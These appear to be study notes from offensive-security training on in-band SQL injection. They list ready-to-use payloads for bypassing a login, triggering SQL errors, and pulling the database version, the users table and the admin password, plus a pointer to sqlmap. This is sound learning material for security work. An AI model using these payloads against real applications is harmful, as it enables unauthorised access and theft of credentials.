
Sometimes the output will not change but the injected input will still process, if this happens it may be worth attempting to inject with sqlmap.

`SQL injection is considered _in-band_ when the vulnerable application provides the result of the query along with the application-returned value. In this scenario, we've enabled SQL debugging inside the web application; however, most production-level web applications won't show these error messages because revealing SQL debugging information is considered a security flaw.`

`offsec' or 1=1 -- //` - force an apostrophe and set or true to attempt bypass of login.

`offsec'` - append a single quote in an attempt to reveal an SQL syntax error.

`' or  1=1 in (select @@version) -- //` - spit out version of current MySQL server (@@version also works for MySQL as well as MSSQL).

`' or 1=1 in (select * from users) -- //` - retrieving all users from users table with sqli. If face with error - understand and try again, you main only be able to select one column at a time.

`' or 1=1 in (select password from users) -- //` - selecting a single column from a table.

`' or 1=1 in (select password from users where username = 'admin')` - specify single column injection.